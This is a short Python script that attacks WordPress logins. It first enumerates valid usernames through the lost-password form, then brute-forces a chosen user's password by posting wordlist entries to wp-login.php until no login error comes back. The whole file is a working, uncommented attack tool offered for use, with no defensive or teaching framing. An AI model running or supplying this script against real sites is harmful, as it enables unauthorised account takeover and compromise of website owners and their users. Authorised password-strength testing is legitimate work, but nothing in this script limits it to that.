from requests import post,get,Session
from sys import argv
words=open(argv[2],"r").read().splitlines()
if argv[3]=="name":
   for word in words:
      data={'user_login': word,'redirect_to':'','wp-submit':'Get+New+Password'}
      x=post(argv[1]+"/wp-login.php?action=lostpassword", data=data)
      print(word)
      if "login_error" not in x.text:
         print(word,"True")
         exit()
else:
   s = Session()
   cookie=dict(get(argv[1]+"/wp-login.php").cookies)
   for word in words:
      data={"log":argv[4],"pwd":word.strip(),"wp-submit":"Log+In","redirect_to": argv[1]+"/wp-admin/","testcookie":"1"}
      x=post(argv[1]+"/wp-login.php", data=data,cookies=cookie,allow_redirects=True)
      print(word.strip())
      if "login_error" not in x.text:
         print(word.strip(),"True")
         exit()
